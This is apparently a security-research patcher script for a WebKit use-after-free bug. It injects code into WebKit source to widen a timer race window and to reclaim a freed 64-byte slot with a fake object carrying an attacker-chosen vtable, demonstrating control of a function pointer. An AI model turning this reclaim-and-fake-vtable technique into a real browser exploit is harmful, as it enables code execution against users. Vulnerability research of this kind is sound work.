#!/usr/bin/env python3
"""WK_INTERPOSE_EXPERIMENT patcher for BZ 315533 (WebKit pre-fix parent).

Applies research instrumentation IN THE UIPROCESS to the correct (true
pre-fix) revision, proving the primitive the analyst asks about:

  1. RunLoopCF.cpp  - widen the in-flight callback window: the timer
     callback sleeps WK_INTERPOSE_USLEEP_US (default 60 ms) BEFORE it
     virtual-dispatches through the raw context pointer. On real
     hardware the natural race window is sub-ms and probabilistic
     (~30% per 5-round exposure, device characterization); the widened
     window is RESEARCH INSTRUMENTATION so the primitive can be
     demonstrated deterministically on a CI runner.
  2. RemoteLayerTreeEventDispatcher.mm - make the teardown explicit:
     in ~RemoteLayerTreeEventDispatcher, destroy the timer (as member
     destruction would: on the MAIN thread, racing the scrolling
     callback), then IMMEDIATELY reclaim the freed 64-byte slot with a
     fake object whose +0 vptr and +8.. payload are fully chosen by
     this code. If the scrolling thread's in-flight callback dispatches
     through our fake vtable, wkInterposeHit() logs WK-INTERPOSE-HIT -
     i.e. a function pointer under our control was invoked on the
     scrolling thread through freed memory: the RIP-control-class
     primitive.

Everything is logged to /tmp/wk-interpose-log.txt (WK-INTERPOSE prefix)
so the workflow's verdict step can grep for it.
"""
import os
import sys

MM = "Source/WebKit/UIProcess/RemoteLayerTree/mac/RemoteLayerTreeEventDispatcher.mm"
CF = "Source/WTF/wtf/cf/RunLoopCF.cpp"
USLEEP = os.environ.get("WK_INTERPOSE_USLEEP_US", "60000")

def patch(path, old, new, tag):
    with open(path) as fh:
        src = fh.read()
    if old not in src:
        sys.exit(f"PATCH {tag}: pattern not found in {path}")
    src = src.replace(old, new, 1)
    with open(path, "w") as fh:
        fh.write(src)
    print(f"PATCH {tag}: applied to {path}")

# ---- 1. dispatcher dtor: explicit free + controlled reclaim -------------
MM_OLD = """RemoteLayerTreeEventDispatcher::~RemoteLayerTreeEventDispatcher()
{
#if ENABLE(MOMENTUM_EVENT_DISPATCHER)
    ASSERT(!m_momentumEventDispatcher);
#endif
    ASSERT(!m_displayRefreshObserverID);
}"""
MM_NEW = """// ---- WK_INTERPOSE_EXPERIMENT (research instrumentation) ------------------
#include <fcntl.h>
#include <unistd.h>
static void wkInterposeLog(const char* tag, const void* a, const void* b)
{
    int fd = open("/tmp/wk-interpose-log.txt", O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd >= 0) {
        char buf[256];
        int n = snprintf(buf, sizeof(buf), "WK-INTERPOSE %s a=%p b=%p\\n", tag, a, b);
        if (n > 0) write(fd, buf, static_cast<size_t>(n));
        close(fd);
    }
}
static void wkInterposeHit() { wkInterposeLog("HIT", nullptr, nullptr); }
static void* wkInterposeFakeVtable[16] = {
    (void*)&wkInterposeHit, (void*)&wkInterposeHit, (void*)&wkInterposeHit,
    (void*)&wkInterposeHit, (void*)&wkInterposeHit, (void*)&wkInterposeHit,
    (void*)&wkInterposeHit, (void*)&wkInterposeHit, (void*)&wkInterposeHit,
    (void*)&wkInterposeHit, (void*)&wkInterposeHit, (void*)&wkInterposeHit,
    (void*)&wkInterposeHit, (void*)&wkInterposeHit, (void*)&wkInterposeHit,
    (void*)&wkInterposeHit,
};
RemoteLayerTreeEventDispatcher::~RemoteLayerTreeEventDispatcher()
{
#if ENABLE(MOMENTUM_EVENT_DISPATCHER)
    ASSERT(!m_momentumEventDispatcher);
#endif
    ASSERT(!m_displayRefreshObserverID);
    if (m_delayedRenderingUpdateDetectionTimer) {
        auto* raw = m_delayedRenderingUpdateDetectionTimer.release();
        wkInterposeLog("TEARDOWN-FREE", raw, nullptr);
        delete raw; // pre-fix: destroyed on the MAIN thread while the
                    // scrolling thread's CFRunLoopTimer callback may be
                    // in flight holding this raw pointer as context.
        auto* bytes = static_cast<unsigned char*>(malloc(64)); // same 64-byte class
        if (bytes) {
            auto** vptrSlot = reinterpret_cast<void**>(bytes);
            vptrSlot[0] = (void*)&wkInterposeFakeVtable;    // controlled vptr
            for (size_t i = 8; i < 64; ++i)                 // attacker-influenced bytes
                bytes[i] = 0x41;
            wkInterposeLog("SLOT-RECLAIMED", raw, bytes);   // freed vs reclaimed addr
        }
    }
}"""

patch(MM, MM_OLD, MM_NEW, "dispatcher-dtor")

# ---- 2. RunLoopCF.cpp: widen the in-flight callback window --------------
CF_OLD = """        auto timer = static_cast<TimerBase*>(context);
        if (!CFRunLoopTimerDoesRepeat(cfTimer))
            CFRunLoopTimerInvalidate(cfTimer);

        timer->fired();"""
CF_NEW = """        auto timer = static_cast<TimerBase*>(context);
        if (!CFRunLoopTimerDoesRepeat(cfTimer))
            CFRunLoopTimerInvalidate(cfTimer);

        // WK_INTERPOSE_EXPERIMENT: research widening of the in-flight window
        // (device-side the natural window is sub-ms and probabilistic).
        usleep(""" + USLEEP + """);

        timer->fired();"""

patch(CF, CF_OLD, CF_NEW, "runloop-window")

# usleep needs unistd.h
patch(CF, "#include <wtf/RunLoop.h>",
      "#include <wtf/RunLoop.h>\n#include <unistd.h>", "unistd")

print("WK_INTERPOSE_EXPERIMENT: all patches applied")